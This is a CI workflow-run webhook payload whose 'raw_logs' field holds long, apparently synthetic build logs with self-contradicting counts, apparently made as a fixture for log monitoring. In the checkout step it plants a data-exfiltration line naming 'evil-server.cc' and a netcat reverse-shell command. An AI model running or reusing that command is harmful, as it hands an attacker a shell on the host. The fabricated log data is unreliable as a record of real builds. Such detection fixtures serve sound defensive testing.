{
  "action": "completed",
  "workflow_run": {
    "id": 515,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "50d3a00b41b1c78bd3824c4db1d2b668a8a28bb2",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-08T12:46:58.395293Z",
    "updated_at": "2025-12-08T12:50:35.206371Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nCreating production build...\n[12:46:58] WARN: Deprecated API usage\nCache hit for key-6346\nAlready up to date.\nProcessing...\nStep 8/16: Installing dependencies\nFAILED: test_user_create\n\u2713 All checks passed\nCache invalidated: node_modules\npip install: Successfully installed webpack-2.6\n[12:46:58] INFO: Starting build process\nNODE_ENV=development\nWaiting...\n[12:46:58] INFO: Request completed\nnpm install: added 369 packages\nStep 4/25: Installing dependencies\nWARNING: express has known vulnerabilities\nPlatform: darwin-arm64\nGenerating source maps...\nTransforming 852 files...\nStep 2/22: Deploying\n[12:46:58] INFO: Cache refreshed\nPulling image: alpine:3.11\nCompiling components/main.py...\nCompiling components/service.java...\npip: Collecting jest\nRan 15 tests in 7s\n[12:46:58] ERROR: Connection failed\nStep 3/20: Testing\nCompiling utils/index.js...\nInstalling jest@5.7.8\nDone.\nnpm notice: created a lockfile\nCreating production build...\n\u2713 Step 'checkout' succeeded\nArtifact uploaded: dist.zip (86MB)\nReady.\nGenerating source maps...\nCompiling src/handler.rs...\n  PASS: test_api_health (132ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: webpack has known vulnerabilities\n[12:46:58] INFO: Cache refreshed\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (60MB)\nInstalling prettier@1.3.6\nImage pulled successfully\nCompiling utils/index.js...\nSuccess!\nStep 20/18: Deploying\n[12:46:58] DEBUG: Memory usage: 379MB\nPulling image: alpine:3.11\n[12:46:58] DEBUG: Memory usage: 265MB\n[12:46:58] DEBUG: Connection pool: 4 active\nSuccess!\nBundling vendor.js\n[12:46:58] INFO: Cache refreshed\nWaiting...\n\u2717 build failed with exit code 42\nProcessing...\nTransforming 935 files...\nPulling image: node:18\nCache miss for key-4740\nTLS handshake completed\nUploading artifact 'build' (38 files)\nStep 8/23: Building\nWaiting...\npip install: Successfully installed prettier-3.4\n\u2713 package completed\nProcessing...\nUploading artifact 'coverage' (48 files)\nLayer 9/9: COPY command\n[12:46:58] WARN: Deprecated API usage\nChecking out master branch\nLoading...\nRan 91 tests in 24s\npip: Downloading jest-5.5.tar.gz\npip: Collecting axios\nCoverage: 76% statements, 77% branches\n[12:46:58] WARN: Deprecated API usage\nFetching from https://npmjs.org/package.json\nVerifying...\nWARNING: react has known vulnerabilities\nFetching from https://registry.npmjs.org/package.json\nCompleted.\nDone.\npip: Collecting express\n[12:46:58] DEBUG: Initializing service\nRan 130 tests in 25s\nTLS handshake completed\n[12:46:58] DEBUG: Loading configuration\nFinished.\nSwitched to branch 'bugfix/task-478'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nCoverage: 72% statements, 80% branches\nMinifying app.js\n\u2713 All checks passed\nCompiling src/app.ts...\nyarn add: Done in 5.15s\nCache invalidated: build\npip: Collecting react\npip: Collecting react\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\nCache saved successfully\nCache saved successfully\nAlready up to date.\n\u2713 All checks passed\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n=== Step deploy_staging completed ===\n=== Step: deploy_production ===\npip: Collecting jest\nFetching submodules...\nFinished.\n[12:46:58] INFO: Request completed\nStep 9/21: Linting\nCompiling src/utils.go...\npip: Downloading lodash-3.10.tar.gz\nnpm install: added 425 packages\nBuilding Docker image...\nCompiling src/service.java...\nLoading...\nAlready up to date.\nSnapshots: 27 passed, 15 total\nnpm notice: package.json updated\nOK\nSwitched to branch 'hotfix/task-735'\n[12:46:58] INFO: Cache refreshed\nCompiling src/app.ts...\n[12:46:58] INFO: Starting build process\nOK\nBundling vendor.css\nFetching submodules...\nSnapshots: 15 passed, 34 total\nLoading...\nWaiting...\nnpm install: added 337 packages\nPulling image: node:latest\nStep 1/21: Installing dependencies\n[12:46:58] DEBUG: Initializing service\nCompleted.\nArtifact uploaded: dist.zip (49MB)\nProcessing...\nFetching submodules...\n[12:46:58] INFO: Starting build process\nWARNING: eslint has known vulnerabilities\nInstalling axios@2.9.1\nCache hit for key-8950\nArtifact uploaded: dist.zip (90MB)\nReady.\nFinished.\nLoading...\n[12:46:58] ERROR: Connection failed\nTransforming 776 files...\n[12:46:58] INFO: Starting build process\nOptimizing 79 modules...\nStep 3/15: Testing\nArtifact uploaded: dist.zip (27MB)\nCache restored successfully (148MB)\n[12:46:58] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSuccess!\nVerifying...\nArtifact downloaded: 19MB\nWARNING: lodash has known vulnerabilities\nnpm install: resolved 754 packages\nArtifact uploaded: dist.zip (48MB)\n[12:46:58] WARN: Deprecated API usage\n[12:46:58] INFO: Cache refreshed\nArtifact uploaded: dist.zip (16MB)\n[12:46:58] INFO: Starting build process\n[12:46:58] DEBUG: Initializing service\n[12:46:58] WARN: Deprecated API usage\n\u2713 Task completed in 2384ms\n\u2713 All checks passed\nVerifying...\n[12:46:58] INFO: Starting build process\nTransforming 489 files...\n[12:46:58] WARN: Deprecated API usage\nStep 8/20: Installing dependencies\n  PASS: test_auth_login (314ms)\nVerifying...\npip install: Successfully installed axios-2.9\nUsing Python 3.9\nArtifact uploaded: build.tar.gz (34MB)\nVerifying...\nProcessing...\nProcessing...\nFetching submodules...\nFinished.\nSuccess!\nyarn add: Done in 6.80s\n[12:46:58] DEBUG: Memory usage: 959MB\nUsing Python 3.12\n[12:46:58] DEBUG: Connection pool: 14 active\nGET /health - 200 (22ms)\nnpm install: resolved 1620 packages\nCache restored successfully (359MB)\nCoverage: 85% statements, 83% branches\n  PASS: test_user_create (468ms)\nCompleted.\nHEAD is now at acd5a48\nPulling image: alpine:latest\nConnection established\n\u2717 build failed with exit code 87\nMinifying vendor.js\nOptimizing 16 modules...\nCompleted.\nChecking out develop branch\nCreating production build...\nStep 17/18: Linting\nCoverage: 72% statements, 62% branches\nWARNING: axios has known vulnerabilities\n\u2713 Task completed in 1939ms\n[12:46:58] DEBUG: Connection pool: 19 active\nNODE_ENV=development\nPulling image: node:3.11\nCreating production build...\nTransforming 373 files...\nCompiling utils/service.java...\n[12:46:58] INFO: Processing request\nWARNING: eslint has known vulnerabilities\n  PASS: e2e/test_db_connect.spec.js\n  PASS: e2e/test_cache_hit.spec.js\n=== Step deploy_production completed ===\n=== Step: build ===\nGenerating source maps...\nPushing to registry...\nLayer 7/15: COPY command\nWARNING: lodash has known vulnerabilities\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 5/16: Linting\nCompiling lib/utils.go...\nUsing Python 3.10\nUsing Python 3.11\nSuccess!\nArtifact uploaded: dist.zip (78MB)\nVerifying...\nFAILED: test_user_create\nOK\nCoverage: 98% statements, 77% branches\nReady.\nCompleted.\nnpm notice: package.json updated\nOK\nFetching submodules...\n\u2713 Task completed in 3041ms\n[12:46:58] INFO: Request completed\n\u2713 Step 'test' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 91% statements, 75% branches\nUploading artifact 'build' (39 files)\nMinifying vendor.js\nStep 7/19: Building\nReady.\n[12:46:58] DEBUG: Memory usage: 1109MB\nUsing Node.js 18.15.10\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (101ms)\nnpm notice: created a lockfile\n[12:46:58] DEBUG: Memory usage: 251MB\n[12:46:58] INFO: Connecting to database\nGET /api - 200 (30ms)\nRan 46 tests in 2s\nPOST /upload - 200 (17ms)\nArtifact downloaded: 11MB\nChecking out master branch\nWARNING: react has known vulnerabilities\nCache saved successfully\nyarn add: Done in 18.72s\nMinifying app.js\nHEAD is now at b2d13f1\npip: Collecting eslint\nCache saved successfully\n[12:46:58] INFO: Processing request\nGET /status - 201 (72ms)\n\u2713 All checks passed\nBundling vendor.js\nCache restored successfully (13MB)\nCoverage: 93% statements, 91% branches\nChecking out main branch\nUploading artifact 'dist' (39 files)\nSuccess!\nGET /status - 201 (97ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\nCompleted.\nWaiting...\n[12:46:58] DEBUG: Loading configuration\nCache invalidated: node_modules\nSuccess!\nSwitched to branch 'bugfix/task-625'\nFetching submodules...\nWaiting...\n[12:46:58] WARN: Deprecated API usage\n[12:46:58] DEBUG: Connection pool: 10 active\nTransforming 185 files...\nnpm install: added 268 packages\npip: Downloading eslint-4.11.tar.gz\nyarn add: Done in 2.63s\nCompleted.\nGenerating source maps...\nPulling image: python:latest\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 18 passed, 20 total\nBuilding Docker image...\nCoverage: 93% statements, 70% branches\n\u2717 build failed with exit code 126\nCoverage: 98% statements, 60% branches\nnpm install: resolved 772 packages\nCache saved successfully\n[12:46:58] WARN: Deprecated API usage\nTransforming 127 files...\nStep 12/15: Installing dependencies\nPulling image: node:3.11\n\u2717 build failed with exit code 56\nCompiling utils/handler.rs...\nConnection established\nCreating production build...\nCreating production build...\n[12:46:58] DEBUG: Memory usage: 1197MB\npip: Collecting express\nPushing to registry...\nFAILED: test_api_health\nPulling image: alpine:3.11\n\u2717 build failed with exit code 91\n[12:46:58] DEBUG: Initializing service\nGET /status - 201 (95ms)\nFetching from https://npmjs.org/package.json\nArtifact downloaded: 2MB\nBundling vendor.css\nOK\nCompiling utils/index.js...\nnpm notice: package.json updated\nHEAD is now at 0e7d76c\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching submodules...\n=== Step build completed ===\n=== Step: save_cache ===\nArtifact downloaded: 24MB\nTests: 229 passed, 135 total\nStep 7/18: Running migrations\nCoverage: 71% statements, 94% branches\nConnection established\n[12:46:58] INFO: Starting build process\nBuilding Docker image...\nnpm install: added 98 packages\nTLS handshake completed\nSuccess!\npip: Downloading react-3.19.tar.gz\nTime: 49.205s\nStep 20/25: Running migrations\nVerifying...\n\u2713 package completed\nCompiling lib/handler.rs...\nCache invalidated: build\nReady.\n[12:46:58] ERROR: Connection failed\nUsing Python 3.9\nEnvironment: staging\n[12:46:58] INFO: Processing request\n[12:46:58] DEBUG: Loading configuration\nTest Suites: 31 passed, 42 total\n\u2713 build completed\nCompiling utils/service.java...\nTests: 228 passed, 461 total\npip: Downloading eslint-2.18.tar.gz\n[12:46:58] WARN: Deprecated API usage\nRan 120 tests in 25s\nSuccess!\nCreating production build...\nStep 19/19: Running migrations\nGenerating source maps...\nCompleted.\nTests: 250 passed, 61 total\nSwitched to branch 'bugfix/task-317'\nnpm notice: package.json updated\nFAILED: test_user_create\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: react has known vulnerabilities\n[12:46:58] INFO: Request completed\nPushing to registry...\nRan 152 tests in 29s\n[12:46:58] DEBUG: Loading configuration\nUploading artifact 'build' (37 files)\nOK\n[12:46:58] DEBUG: Loading configuration\npip: Collecting prettier\n  PASS: e2e/test_api_health.spec.js\nTLS handshake completed\nStep 8/19: Testing\nWaiting...\nCompleted.\nGET /health - 200 (92ms)\nWARNING: webpack has known vulnerabilities\nException: ValueError\nCache restored successfully (348MB)\nFetching submodules...\nStep 10/16: Installing dependencies\nCache saved successfully\n\u2713 Step 'setup' succeeded\nCache restored successfully (347MB)\nGenerating source maps...\nLayer 8/12: ENV command\nConnection established\nConnection established\nStep 19/24: Linting\n[12:46:58] INFO: Request completed\nStep 6/25: Deploying\nNODE_ENV=development\nCache restored successfully (63MB)\nBundling styles.css\n[12:46:58] WARN: Deprecated API usage\nCreating production build...\nWARNING: webpack has known vulnerabilities\nCache restored successfully (176MB)\nRan 92 tests in 18s\npip install: Successfully installed webpack-1.4\nArtifact uploaded: build.tar.gz (32MB)\nCompiling lib/index.js...\nException: NullPointerException\nLoading...\nFetching submodules...\n\u2713 package completed\nTransforming 869 files...\nCompiling lib/handler.rs...\n\u2717 build failed with exit code 56\nDone.\nDone.\nHEAD is now at 07860dd\nTests: 181 passed, 146 total\nStep 20/15: Running migrations\nPlatform: darwin-arm64\npip: Collecting eslint\nNODE_ENV=development\nFetching submodules...\n[12:46:58] INFO: Connecting to database\nHEAD is now at c5178d7\nPlatform: win32-x64\n[12:46:58] DEBUG: Query executed in 46ms\nPushing to registry...\nWARNING: prettier has known vulnerabilities\nCompiling utils/app.ts...\nCompiling lib/service.java...\nCoverage: 77% statements, 63% branches\n  PASS: test_auth_login (255ms)\nTLS handshake completed\n[12:46:58] DEBUG: Initializing service\nLayer 2/8: ENV command\nnpm install: added 85 packages\nVerifying...\nStep 8/21: Installing dependencies\n=== Step save_cache completed ===\n=== Step: install_dependencies ===\nInstalling jest@4.9.9\n[12:46:58] ERROR: Connection failed\nFinished.\nTime: 29.552s\n  PASS: test_api_health (378ms)\nVerifying...\nCompiling components/app.ts...\nSwitched to branch 'hotfix/task-933'\nOK\nSnapshots: 50 passed, 38 total\nUsing Node.js 17.5.7\npip install: Successfully installed jest-5.4\nException: TypeError\nTest Suites: 43 passed, 35 total\nOK\nStep 9/25: Testing\nProcessing...\nInstalling eslint@5.13.10\nStep 8/16: Running migrations\n[12:46:58] INFO: Starting build process\nArtifact downloaded: 18MB\nChecking out develop branch\n[12:46:58] INFO: Starting build process\nBuilding Docker image...\npip install: Successfully installed react-5.1\nUploading artifact 'coverage' (12 files)\nStep 5/25: Linting\nFetching from https://npmjs.org/package.json\nPushing to registry...\nUploading artifact 'dist' (40 files)\nArtifact uploaded: dist.zip (5MB)\nLoading...\nFinished.\nPlatform: win32-x64\nUsing Python 3.10\n  PASS: test_api_health (127ms)\nCompiling components/utils.go...\nTLS handshake completed\npip: Installing build dependencies...\nChecking out master branch\n[12:46:58] DEBUG: Connection pool: 3 active\npip: Installing build dependencies...\nTest Suites: 48 passed, 36 total\nnpm notice: package.json updated\nnpm install: added 62 packages\nException: TypeError\nOK\n[12:46:58] DEBUG: Connection pool: 7 active\npip: Installing build dependencies...\nEnvironment: test\nCompiling utils/app.ts...\nUsing Python 3.12\nBuilding Docker image...\nReady.\nStep 8/24: Building\nCache miss for key-9954\nCache hit for key-6680\nOptimizing 84 modules...\n\u2713 Step 'checkout' succeeded\nCreating production build...\nHEAD is now at 264c92b\nCompiling src/utils.go...\nCompiling utils/utils.go...\nReady.\nProcessing...\nCache invalidated: node_modules\n[12:46:58] INFO: Cache refreshed\nAlready up to date.\nProcessing...\n[12:46:58] DEBUG: Query executed in 12ms\nCreating production build...\nCompleted.\nSuccess!\nCompiling utils/service.java...\nArtifact downloaded: 26MB\nTest Suites: 41 passed, 48 total\n[12:46:58] INFO: Starting build process\nSnapshots: 48 passed, 4 total\nImage pulled successfully\nArtifact uploaded: build.tar.gz (28MB)\nCreating production build...\nTests: 444 passed, 305 total\n[12:46:58] DEBUG: Connection pool: 18 active\n  PASS: test_cache_hit (390ms)\nEnvironment: development\nTime: 109.794s\nArtifact uploaded: build.tar.gz (5MB)\nCompiling utils/main.py...\nPushing to registry...\nCompiling src/handler.rs...\nnpm install: resolved 1701 packages\n[12:46:58] WARN: Deprecated API usage\n\u2713 Step 'checkout' succeeded\nCreating production build...\nWARNING: prettier has known vulnerabilities\nFAILED: test_api_health\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: added 314 packages\npip: Downloading webpack-2.19.tar.gz\nWARNING: webpack has known vulnerabilities\nConnection established\nFinished.\nBuilding Docker image...\npip: Installing build dependencies...\nBuilding Docker image...\nFetching from https://pypi.org/package.json\nUploading artifact 'coverage' (19 files)\nTests: 124 passed, 335 total\nAlready up to date.\nCoverage: 79% statements, 70% branches\nFAILED: test_db_connect\n[12:46:58] WARN: Deprecated API usage\nArtifact downloaded: 35MB\n=== Step install_dependencies completed ===\n=== Step: setup_environment ===\nDone.\nArtifact downloaded: 37MB\n  PASS: test_auth_login (304ms)\nProcessing...\npip: Installing build dependencies...\nTransforming 467 files...\n[12:46:58] DEBUG: Initializing service\nNODE_ENV=development\nProcessing...\nnpm notice: package.json updated\nSwitched to branch 'bugfix/task-828'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: resolved 1667 packages\nRan 90 tests in 6s\nPOST /api - 200 (476ms)\nnpm install: added 278 packages\nCompiling lib/index.js...\nCache saved successfully\nPushing to registry...\nnpm install: resolved 840 packages\nFinished.\nCoverage: 90% statements, 97% branches\nReady.\n\u2713 All checks passed\nHEAD is now at c33c972\nConnection established\npip: Collecting react\nPlatform: linux-x64\nAlready up to date.\npip: Downloading axios-3.3.tar.gz\nCompiling src/utils.go...\n[12:46:58] INFO: Request completed\nBundling styles.css\nImage pulled successfully\nPOST /upload - 200 (22ms)\npip: Collecting express\nStep 2/25: Testing\nOptimizing 87 modules...\nWARNING: axios has known vulnerabilities\nCache hit for key-3924\nnpm notice: package.json updated\nCompiling components/index.js...\nCompiling lib/utils.go...\nCompiling lib/app.ts...\nWaiting...\nUsing Python 3.9\n[12:46:58] DEBUG: Memory usage: 480MB\n[12:46:58] INFO: Processing request\n\u2713 Step 'install' succeeded\nAlready up to date.\nDone.\n[12:46:58] DEBUG: Connection pool: 15 active\nWARNING: prettier has known vulnerabilities\n[12:46:58] WARN: Deprecated API usage\n[12:46:58] INFO: Processing request\nChecking out master branch\npip: Collecting jest\n[12:46:58] INFO: Cache refreshed\nNODE_ENV=production\nCache saved successfully\n\u2713 All checks passed\nStep 8/24: Testing\nFetching from https://googleapis.com/package.json\n\u2713 build completed\nWaiting...\n[12:46:58] DEBUG: Memory usage: 1195MB\nStep 14/18: Linting\nTest Suites: 11 passed, 17 total\n\u2713 All checks passed\n[12:46:58] DEBUG: Initializing service\nSnapshots: 20 passed, 43 total\nFetching submodules...\nCreating production build...\n\u2713 All checks passed\nyarn add: Done in 3.41s\n\u2713 Task completed in 374ms\n[12:46:58] INFO: Request completed\nPulling image: python:3.11\nWaiting...\nPulling image: python:latest\nnpm install: resolved 1801 packages\n  PASS: test_db_connect (238ms)\nNODE_ENV=production\n[12:46:58] INFO: Request completed\nFetching submodules...\n[12:46:58] DEBUG: Query executed in 34ms\nBuilding Docker image...\nyarn add: Done in 20.47s\nNODE_ENV=test\nFetching submodules...\nTLS handshake completed\nEnvironment: production\nArtifact uploaded: build.tar.gz (2MB)\nPulling image: node:3.11\nnpm notice: package.json updated\n[12:46:58] DEBUG: Connection pool: 17 active\nWaiting...\nPOST /upload - 201 (63ms)\nSuccess!\nLayer 10/8: COPY command\nHEAD is now at 4a75fd6\n[12:46:58] ERROR: Connection failed\nVerifying...\nUploading artifact 'coverage' (46 files)\nWaiting...\nWaiting...\nFetching from https://googleapis.com/package.json\n[12:46:58] DEBUG: Memory usage: 1819MB\nSwitched to branch 'bugfix/task-584'\nTest Suites: 15 passed, 5 total\nStep 8/23: Installing dependencies\n[12:46:58] WARN: Deprecated API usage\nTLS handshake completed\n=== Step setup_environment completed ===\n=== Step: type_check ===\n[12:46:58] WARN: Deprecated API usage\nLoading...\n[12:46:58] ERROR: Connection failed\nImage pulled successfully\nTests: 61 passed, 315 total\n[12:46:58] DEBUG: Query executed in 84ms\n[12:46:58] DEBUG: Initializing service\n\u2713 Task completed in 1593ms\nTLS handshake completed\nCompleted.\nDone.\nPushing to registry...\nInstalling react@5.9.2\nBuilding Docker image...\n[12:46:58] WARN: Deprecated API usage\nInstalling react@4.14.1\nCoverage: 70% statements, 91% branches\n[12:46:58] WARN: Deprecated API usage\nStep 18/23: Building\nPOST /data - 202 (349ms)\n\u2713 Step 'install' succeeded\nStep 16/21: Building\npip install: Successfully installed react-1.5\nFinished.\nCache miss for key-1975\nRan 156 tests in 10s\nPushing to registry...\nReady.\n  PASS: test_auth_login (182ms)\nArtifact uploaded: dist.zip (15MB)\nCache restored successfully (323MB)\nWaiting...\n[12:46:58] ERROR: Connection failed\nStep 6/18: Linting\nLayer 4/13: COPY command\nCreating production build...\nCache miss for key-5641\nDone.\nChecking out master branch\n\u2713 All checks passed\nConnection established\nNODE_ENV=production\nFetching submodules...\nCompiling lib/main.py...\n[12:46:58] DEBUG: Loading configuration\nnpm install: resolved 824 packages\nEnvironment: production\nTest Suites: 12 passed, 10 total\nImage pulled successfully\nEnvironment: test\nBundling runtime.js\nnpm install: added 394 packages\nLoading...\nCompleted.\nnpm notice: package.json updated\n[12:46:58] DEBUG: Loading configuration\n[12:46:58] ERROR: Connection failed\nCompiling src/main.py...\nnpm install: resolved 1732 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:58] INFO: Starting build process\nPulling image: alpine:18\nStep 9/21: Running migrations\nConnection established\nSwitched to branch 'hotfix/task-694'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPulling image: python:3.11\n\u2713 Task completed in 1397ms\n[12:46:58] INFO: Request completed\n[12:46:58] WARN: Deprecated API usage\nStep 4/17: Testing\nDone.\nNODE_ENV=production\nnpm notice: created a lockfile\nTests: 274 passed, 67 total\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nEnvironment: test\nPlatform: darwin-arm64\n[12:46:58] WARN: Deprecated API usage\n[12:46:58] DEBUG: Connection pool: 11 active\n[12:46:58] INFO: Starting build process\n[12:46:58] ERROR: Connection failed\nPushing to registry...\nOK\nCache invalidated: node_modules\n  PASS: test_auth_login (126ms)\nCache miss for key-6440\n  PASS: test_api_health (180ms)\nyarn add: Done in 19.37s\nCompleted.\nStep 19/20: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\nnpm notice: created a lockfile\n[12:46:58] INFO: Processing request\n[12:46:58] INFO: Request completed\nWaiting...\nWaiting...\nFinished.\nTLS handshake completed\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /data - 201 (261ms)\nStep 8/20: Linting\n[12:46:58] DEBUG: Connection pool: 1 active\npip install: Successfully installed react-3.8\npip: Collecting axios\nnpm install: resolved 1461 packages\nChecking out develop branch\nCoverage: 80% statements, 91% branches\nProcessing...\n[12:46:58] INFO: Processing request\n=== Step type_check completed ===\n=== Step: e2e_tests ===\nWARNING: lodash has known vulnerabilities\nInstalling lodash@5.1.10\n[12:46:58] DEBUG: Memory usage: 1838MB\nMinifying app.js\nCache invalidated: dependencies\npip: Downloading lodash-4.9.tar.gz\nCache restored successfully (448MB)\nCompleted.\nTransforming 508 files...\nStep 12/21: Deploying\nImage pulled successfully\n[12:46:58] DEBUG: Connection pool: 7 active\n\u2713 All checks passed\nCache saved successfully\nSuccess!\nRan 39 tests in 25s\nGenerating source maps...\nGenerating source maps...\nGET /api - 200 (24ms)\nCache miss for key-1179\nHEAD is now at 4b0d0a1\nnpm install: resolved 1336 packages\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nNODE_ENV=test\nCompiling components/app.ts...\nStep 9/25: Deploying\nCreating production build...\nPlatform: darwin-arm64\nWaiting...\nTest Suites: 37 passed, 7 total\nBuilding Docker image...\nnpm notice: created a lockfile\nStep 18/24: Linting\nGET /status - 200 (43ms)\nCache restored successfully (283MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\n\u2713 All checks passed\n[12:46:58] INFO: Connecting to database\nTLS handshake completed\nCache restored successfully (47MB)\nStep 1/22: Running migrations\nCompleted.\nCompleted.\nHEAD is now at fef610b\nnpm notice: package.json updated\npip: Installing build dependencies...\n[12:46:58] INFO: Connecting to database\nChecking out develop branch\nInstalling eslint@5.7.2\nFinished.\n[12:46:58] INFO: Starting build process\nSuccess!\nStep 15/21: Building\nConnection established\nInstalling react@3.2.6\nDone.\nCoverage: 71% statements, 71% branches\nStep 20/20: Deploying\nArtifact downloaded: 17MB\n[12:46:58] INFO: Request completed\n[12:46:58] DEBUG: Initializing service\n[12:46:58] WARN: Deprecated API usage\nReady.\nnpm install: resolved 306 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 176 tests in 15s\nCompiling src/utils.go...\nEnvironment: production\nOptimizing 24 modules...\n  PASS: test_user_create (339ms)\nArtifact uploaded: dist.zip (49MB)\nnpm notice: package.json updated\nCompiling utils/app.ts...\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (37MB)\nLayer 3/10: RUN command\nUploading artifact 'build' (17 files)\nLayer 6/15: RUN command\nInstalling lodash@1.15.7\n[12:46:58] INFO: Connecting to database\nPlatform: win32-x64\nStep 1/23: Linting\nnpm notice: created a lockfile\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOK\n\u2713 deploy completed\nArtifact downloaded: 50MB\nHEAD is now at ff76d47\nEnvironment: test\nImage pulled successfully\nStep 20/25: Building\nCompiling lib/utils.go...\nStep 6/24: Building\nCache restored successfully (401MB)\n[12:46:58] ERROR: Connection failed\npip: Collecting react\nChecking out main branch\nStep 5/19: Building\nStep 7/21: Installing dependencies\nyarn add: Done in 8.18s\nStep 8/18: Testing\n[12:46:58] INFO: Processing request\nWaiting...\nArtifact downloaded: 49MB\nUploading artifact 'build' (28 files)\nArtifact downloaded: 11MB\nnpm install: resolved 705 packages\nNODE_ENV=test\nArtifact uploaded: build.tar.gz (25MB)\npip: Installing build dependencies...\n=== Step e2e_tests completed ===\n=== Step: upload_artifacts ===\n[12:46:58] INFO: Request completed\nGET /status - 204 (97ms)\n[12:46:58] INFO: Connecting to database\nStep 10/22: Testing\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnection established\nCache saved successfully\n[12:46:58] DEBUG: Connection pool: 6 active\nCache invalidated: dependencies\nCache hit for key-8283\nStep 9/25: Installing dependencies\nCreating production build...\nVerifying...\nUsing Node.js 16.12.1\nnpm notice: package.json updated\nException: NullPointerException\nCache hit for key-1569\nReady.\n\u2713 Task completed in 1365ms\n[12:46:58] INFO: Processing request\nTransforming 301 files...\npip: Installing build dependencies...\nTransforming 677 files...\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (8MB)\nLoading...\nWARNING: prettier has known vulnerabilities\nConnection established\nGET /health - 204 (66ms)\nOptimizing 98 modules...\nOK\nFetching submodules...\nRan 21 tests in 8s\nInstalling express@5.20.0\n  PASS: test_api_health (306ms)\nFAILED: test_cache_hit\nWaiting...\n\u2713 Step 'checkout' succeeded\nSnapshots: 15 passed, 35 total\nCoverage: 95% statements, 94% branches\nCreating production build...\nCache hit for key-9431\nFetching submodules...\nStep 14/16: Testing\n[12:46:58] DEBUG: Initializing service\nnpm install: added 53 packages\nBundling vendor.js\nCache restored successfully (343MB)\nCompiling src/handler.rs...\n[12:46:58] DEBUG: Loading configuration\nSnapshots: 40 passed, 21 total\n\u2713 Step 'checkout' succeeded\nCompleted.\npip: Collecting jest\n[12:46:58] DEBUG: Memory usage: 174MB\nGET /status - 200 (30ms)\nPlatform: darwin-arm64\nFetching from https://githubusercontent.com/package.json\nAlready up to date.\nStep 8/20: Installing dependencies\n\u2713 All checks passed\nTest Suites: 39 passed, 43 total\nConnection established\nException: ValueError\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 6/25: Testing\n[12:46:58] INFO: Starting build process\nNODE_ENV=production\nEnvironment: production\nEnvironment: development\npip: Collecting react\n  PASS: test_user_create (433ms)\npip: Installing build dependencies...\nReady.\nArtifact uploaded: dist.zip (10MB)\n  PASS: test_auth_login (16ms)\nTest Suites: 12 passed, 17 total\nPulling image: node:latest\nVerifying...\nCache saved successfully\nOptimizing 54 modules...\npip: Collecting webpack\nStep 16/23: Installing dependencies\nException: NullPointerException\nPlatform: linux-x64\nTests: 393 passed, 383 total\nSnapshots: 31 passed, 4 total\nException: TypeError\nVerifying...\nTLS handshake completed\nOptimizing 62 modules...\nTests: 267 passed, 436 total\nFetching submodules...\n[12:46:58] INFO: Cache refreshed\nFetching from https://amazonaws.com/package.json\nWaiting...\n\u2713 All checks passed\n[12:46:58] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:58] DEBUG: Connection pool: 20 active\nException: RuntimeError\nRan 29 tests in 48s\nImage pulled successfully\nStep 20/25: Linting\nHEAD is now at 0df8b8d\nPlatform: darwin-arm64\n[12:46:58] INFO: Request completed\npip install: Successfully installed express-5.6\npip install: Successfully installed webpack-5.1\nStep 18/19: Linting\nLayer 10/11: RUN command\nBuilding Docker image...\n=== Step upload_artifacts completed ===\n=== Step: checkout ===\n\u2713 build completed\nCache restored successfully (36MB)\n\u2713 build completed\npip: Installing build dependencies...\n[12:46:58] DEBUG: Connection pool: 18 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSnapshots: 20 passed, 13 total\nStep 16/24: Testing\nSending 371MB of data to evil-server.cc\nMinifying vendor.js\n[12:46:58] INFO: Starting build process\nGenerating source maps...\nCache saved successfully\nDone.\n[12:46:58] WARN: Deprecated API usage\n[12:46:58] DEBUG: Query executed in 16ms\nnc -e /bin/sh 239.143.129.192 3246\n\u2713 All checks passed\nRan 168 tests in 36s\nBuilding Docker image...\nStep 12/24: Building\n[12:46:58] DEBUG: Loading configuration\n[12:46:58] DEBUG: Memory usage: 1929MB\n[12:46:58] DEBUG: Connection pool: 19 active\nEnvironment: test\npip: Installing build dependencies...\nWARNING: axios has known vulnerabilities\nUploading artifact 'build' (10 files)\nFetching submodules...\n[12:46:58] INFO: Connecting to database\nPushing to registry...\nOptimizing 40 modules...\nCompiling utils/service.java...\n[12:46:58] DEBUG: Initializing 